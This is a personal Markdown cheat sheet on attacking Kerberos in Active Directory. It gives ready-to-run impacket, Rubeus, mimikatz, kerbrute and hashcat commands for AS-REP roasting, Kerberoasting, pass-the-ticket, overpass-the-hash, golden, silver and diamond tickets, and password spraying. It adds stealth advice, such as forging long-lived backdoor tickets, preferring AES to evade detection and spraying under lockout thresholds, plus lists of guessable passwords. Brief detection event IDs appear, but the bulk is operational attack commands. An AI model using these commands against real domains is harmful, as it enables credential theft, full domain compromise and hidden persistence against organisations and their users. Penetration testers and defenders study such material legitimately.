---
tags: [hacking, active-directory, windows, kerberos]
type: cheatsheet
source: personal Notion — "Active Directory" cheatsheet + additions
last-verified: 2026-09-03
---

# Kerberos Attacks

## Up
- [[Active Directory]]

Attacking the Kerberos ticket flow (see [[AD Fundamentals]] for the protocol). Crack hashes with [[Hashcat]] / [[John the Ripper]] — see [[Password Cracking]].

---

## 1. AS-REP Roasting
Accounts with **pre-auth disabled** (`DONT_REQ_PREAUTH`, UAC `0x400000`) let anyone request an AS-REP whose encrypted blob is derived from the user's password → **crack offline**.

```bash
# no creds — target known/guessed users
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip <dc> -format hashcat -outputfile asrep.txt
# with creds — query AD for vulnerable accounts
impacket-GetNPUsers corp.local/user:pass -dc-ip <dc> -request
nxc ldap <dc> -u user -p pass --asreproast asrep.txt
```
```powershell
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```
Hash `$krb5asrep$23$user@DOMAIN...` → **hashcat -m 18200**:
```bash
hashcat -m 18200 asrep.txt rockyou.txt -r rules/best64.rule
```
**Detect:** Event **4768** with pre-auth type 0.

---

## 2. Kerberoasting
Any authenticated user can request a **service ticket (TGS)** for an SPN; it's encrypted with the **service account's password hash** → crack offline. Service accounts often have weak, non-expiring, high-priv passwords.

```bash
impacket-GetUserSPNs corp.local/user:pass -dc-ip <dc> -request -outputfile tgs.txt
impacket-GetUserSPNs corp.local/user -hashes :<ntlm> -dc-ip <dc> -request
nxc ldap <dc> -u user -p pass --kerberoasting tgs.txt
```
```powershell
Rubeus.exe kerberoast /outfile:tgs.txt        # /tgtdeleg forces RC4 (easier crack)
# PowerView
Get-DomainUser -SPN | Where-Object {$_.memberof -match 'Domain Admins'}
Invoke-Kerberoast -OutputFormat Hashcat
```
Hash `$krb5tgs$23$*user$realm$spn*...` → **hashcat -m 13100**:
```bash
hashcat -m 13100 tgs.txt rockyou.txt -r rules/best64.rule
```
Prioritise SPNs in admin groups / `adminCount=1`. **Detect:** Event **4769**, RC4 requested, many SPNs from one host.

> **Targeted Kerberoasting** — if you have write rights over a user (GenericWrite/GenericAll), *add* an SPN, roast, then remove it. See [[ACL & GPO Abuse]].

---

## 3. Pass-the-Ticket (PtT)
Steal Kerberos tickets from memory (`.kirbi`) or `/tmp/krb5cc_*` (`.ccache`) and reuse them — a ticket **is** the identity, no password needed. Needs local admin/SYSTEM (Windows) or the ccache file (Linux).

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export        # dump tickets to .kirbi
mimikatz # kerberos::ptt ticket.kirbi       # inject
Rubeus.exe dump /nowrap                      # dump (base64)
Rubeus.exe ptt /ticket:<b64|file>
Rubeus.exe createnetonly /program:cmd.exe /ptt /ticket:ticket.kirbi
```
```bash
# Linux — reuse a ccache
find / -name 'krb5cc_*' 2>/dev/null
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=/path/ticket.ccache && klist
impacket-psexec corp.local/user@<target> -k -no-pass     # -k uses the ticket
```
**Detect:** logon (4624 type 3) without a preceding 4768.

---

## 4. Overpass-the-Hash / Pass-the-Key *(added)*
Use an NTLM (or AES) **key** to request a **real TGT** — bridges PtH into the Kerberos world (then PtT). Stealthier than raw NTLM and enables Kerberos-only targets.

```powershell
# Rubeus: NTLM/AES key → TGT → inject
Rubeus.exe asktgt /user:svc /rc4:<ntlm> /ptt
Rubeus.exe asktgt /user:svc /aes256:<aeskey> /ptt      # AES = far stealthier (no RC4 downgrade)
mimikatz # sekurlsa::pth /user:svc /domain:corp.local /ntlm:<hash> /run:cmd.exe
```
```bash
# Linux
impacket-getTGT corp.local/user -hashes :<ntlm>        # → user.ccache
export KRB5CCNAME=user.ccache
```

---

## 5. Golden Ticket
Forge a **TGT** with the **krbtgt** hash → impersonate anyone with any groups, for years. Requires krbtgt NTLM/AES + domain SID (get via DCSync — see [[Lateral Movement & Credential Access]]).

```powershell
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /id:500 /groups:512,513,518,519,520 /ptt
# stealthy long-life / fake user:  /endin:525600 /renewmax:5256000  •  /user:Backdoor /id:1999
```
```bash
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <sid> -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec corp.local/Administrator@<target> -k -no-pass
```
**Persistence:** survives password resets until **krbtgt is rotated twice**. **Detect:** 4624 with no 4768; non-existent users; odd ticket lifetimes/PAC.

> **Diamond / Sapphire tickets** *(added)* — modern variants that avoid Golden's forged-PAC tells: Diamond decrypts a *real* TGT and re-signs a modified PAC; Sapphire embeds a real privileged user's PAC (via S4U). `Rubeus.exe diamond ...`. Harder to detect than a classic Golden.

---

## 6. Silver Ticket
Forge a **service ticket** with a **service/computer account hash** — access one service (CIFS, HTTP, LDAP, HOST, MSSQLSvc, WSMAN) directly, **without touching the KDC** (very stealthy).

```powershell
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:fs.corp.local /service:cifs /rc4:<service_hash> /ptt
```
```bash
impacket-ticketer -nthash <svc_hash> -domain-sid <sid> -domain corp.local -spn cifs/fs.corp.local Administrator
```
Get the service hash via Kerberoast-crack, `sekurlsa::logonpasswords` on the host, or DCSync. **Mitigate:** gMSA, PAC validation, long service passwords.

---

## 7. Password Spraying
One password vs many users → avoids lockout (vs brute force = many passwords vs one user = lockout). **Get the password policy first** ([[AD Enumeration]]).

```bash
kerbrute passwordspray --dc <dc> -d corp.local users.txt 'Winter2026!' --delay 3000
nxc smb <dc> -u users.txt -p 'Winter2026!' --continue-on-success
nxc smb <dc> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success   # pair user:pass lists
```
Candidates: `Season+Year!`, `Company+Year!`, `Welcome1!`, `Password1!`, `Month+Year!`. Stay under the lockout threshold, delay across the window, drop already-locked accounts. **Detect:** Event **4625/4771** across many accounts from one source.

---

## Encryption / hashcat modes
| Attack | Hash prefix | hashcat |
|---|---|---|
| AS-REP Roast | `$krb5asrep$23$` | `18200` |
| Kerberoast | `$krb5tgs$23$` | `13100` |
| Kerberoast (AES256) | `$krb5tgs$18$` | `19700` |
| etype 23 = RC4, 17/18 = AES128/256 | | |

---

## Takeaways
- **No-preauth → AS-REP roast; SPN → Kerberoast; key → Overpass-the-Hash; krbtgt → Golden; service hash → Silver.**
- Prefer **AES** overpass and **Diamond/Sapphire** over classic Golden for stealth.
- Everything cracks in [[Password Cracking]] ([[Hashcat]] 18200/13100); reuse recovered creds **everywhere**.
